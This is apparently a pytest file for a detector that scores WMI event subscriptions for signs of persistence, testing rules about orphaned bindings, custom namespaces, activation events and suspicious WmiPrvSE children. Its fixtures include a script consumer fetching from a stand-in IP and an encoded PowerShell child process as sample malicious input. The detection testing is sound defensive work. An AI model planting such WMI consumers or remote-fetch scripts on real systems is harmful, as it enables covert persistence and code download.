"""Focused tests for rules that are hard to exercise through the dataset.

R12 (binding integrity), R13 (activation context) and R14 (WmiPrvSE child)
are easy to regress because most catalogue scenarios do not trigger them.
"""

from __future__ import annotations

from detector.model import Subscription
from detector.parser import subscriptions_from_repository
from detector.scoring import assess_subscription


def _sub(**overrides: object) -> Subscription:
    values: dict[str, object] = {
        "filter_name": "F",
        "filter_namespace": "root\\subscription",
        "event_namespace": "root\\cimv2",
        "query": "SELECT * FROM __TimerEvent",
        "query_language": "WQL",
        "consumer_name": "C",
        "consumer_class": "CommandLineEventConsumer",
        "consumer_properties": {"CommandLineTemplate": "cmd.exe /c echo x > %TEMP%\\x.txt"},
        "creator_sid": "S-1-5-21-1-2-3-1001",
        "creator_user": "LAB\\user",
        "binding_present": True,
        "has_multiple_consumers": False,
        "source": "repository",
    }
    values.update(overrides)
    return Subscription(**values)  # type: ignore[arg-type]


def _rules(sub: Subscription, **kwargs: object) -> set[str]:
    assessment = assess_subscription(sub, **kwargs)  # type: ignore[arg-type]
    return {item.rule_id for item in assessment.evidence if item.weight > 0}


def test_r12_dangling_filter() -> None:
    assert "R12" in _rules(_sub(binding_present=False))


def test_r12_multiple_consumers() -> None:
    assert "R12" in _rules(_sub(has_multiple_consumers=True))


def test_r12_orphan_repository_objects() -> None:
    repo = {
        "filters": [{"name": "F", "query": "q"}],
        "consumers": [{"name": "C", "class": "CommandLineEventConsumer"}],
        "bindings": [],
    }
    subscriptions = subscriptions_from_repository(repo)
    assert any("R12" in _rules(item) for item in subscriptions)


def test_r14_wmiprvse_suspicious_child() -> None:
    processes = [
        {
            "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -NoProfile -EncodedCommand AAAA",
        }
    ]
    assert "R14" in _rules(_sub(), processes=processes)


def test_r14_ignores_benign_child() -> None:
    processes = [
        {
            "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
            "Image": r"C:\Windows\System32\notepad.exe",
            "CommandLine": r"C:\Windows\System32\notepad.exe",
        }
    ]
    assert "R14" not in _rules(_sub(), processes=processes)


def test_r03_network_primitive() -> None:
    sub = _sub(
        consumer_class="ActiveScriptEventConsumer",
        consumer_properties={
            "ScriptText": 'new ActiveXObject("MSXML2.XMLHTTP").open("GET", "http://198.51.100.9/x")'
        },
    )
    assert "R03" in _rules(sub)


def test_r11_custom_namespaces() -> None:
    assert "R11" in _rules(_sub(filter_namespace="root\\Custom"))
    assert "R11" in _rules(_sub(event_namespace="root\\CustomEvents"))


def test_r13_repository_object_without_5861() -> None:
    assert "R13" in _rules(_sub())


def test_r13_user_activation() -> None:
    events = [
        {
            "EventId": 5861,
            "User": "LAB\\user",
            "Message": "Eventfilter = F (refer to its activate eventid:5859)",
        }
    ]
    assert "R13" in _rules(_sub(), events=events)


def test_r13_system_activation_is_not_evidence() -> None:
    events = [
        {
            "EventId": 5861,
            "User": "NT AUTHORITY\\SYSTEM",
            "Message": "Eventfilter = F (refer to its activate eventid:5859)",
        }
    ]
    assert "R13" not in _rules(_sub(), events=events)


def test_rule_ablation_can_disable_a_rule() -> None:
    sub = _sub()
    baseline = _rules(sub)
    ablated = _rules(sub, exclude_rules={"R01"})
    assert "R01" in baseline
    assert "R01" not in ablated
